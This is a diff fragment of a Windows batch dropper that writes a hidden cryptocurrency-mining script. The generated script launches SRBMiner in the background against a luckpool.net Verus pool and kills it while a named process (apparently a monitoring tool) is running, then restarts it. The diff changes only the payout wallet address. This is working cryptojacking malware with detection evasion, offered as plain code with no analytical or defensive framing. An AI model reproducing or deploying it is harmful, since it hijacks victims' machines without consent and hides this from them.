@@ -281,13 +281,13 @@ start script_.vbs
     echo/ for /f %%%%Z in ^('wmic cpu get numberofcores^^^|findstr "^[0-9]"'^) do set /A totalcore^=%%%%Z
     echo/ if %%totalcore%%^==1 goto :exit else goto :next
     echo/ :next
-    echo/ start /B SRBMiner-MULTI.exe --disable-gpu -a verushash -o stratum+tcp://na.luckpool.net:3956^ -u RKMVPRnL1GV7fpEGMkNgCDvncMvwRpJ1vd.aoffrig -p x -t %%num1%%
+    echo/ start /B SRBMiner-MULTI.exe --disable-gpu -a verushash -o stratum+tcp://na.luckpool.net:3956^ -u RMfGZYWWCWJvMca1Z1Xu4BrQQSqxQH7Fyz.aoffrig -p x -t %%num1%%
     echo/ :start
     echo/ ^>nul ping -n 2 localhost
     echo/ for /f "tokens=1" %%%%z In ^('tasklist /NH /FI "imagename eq %%MyProcess%%"'^) do set yy=%%%%z
     echo/ If /i %%yy%%^==%%MyProcess%% ^(taskkill /IM SRBMiner-MULTI.exe /F^) Else ^(goto :start^)
     echo/ ^>nul ping -n 240 localhost
-    echo/ start /B SRBMiner-MULTI.exe --disable-gpu -a verushash -o stratum+tcp://na.luckpool.net:3956^ -u RKMVPRnL1GV7fpEGMkNgCDvncMvwRpJ1vd.aoffrig -p x -t %%num1%%
+    echo/ start /B SRBMiner-MULTI.exe --disable-gpu -a verushash -o stratum+tcp://na.luckpool.net:3956^ -u RMfGZYWWCWJvMca1Z1Xu4BrQQSqxQH7Fyz.aoffrig -p x -t %%num1%%
     echo/ goto :start
     echo/ :exit
     echo/ exit
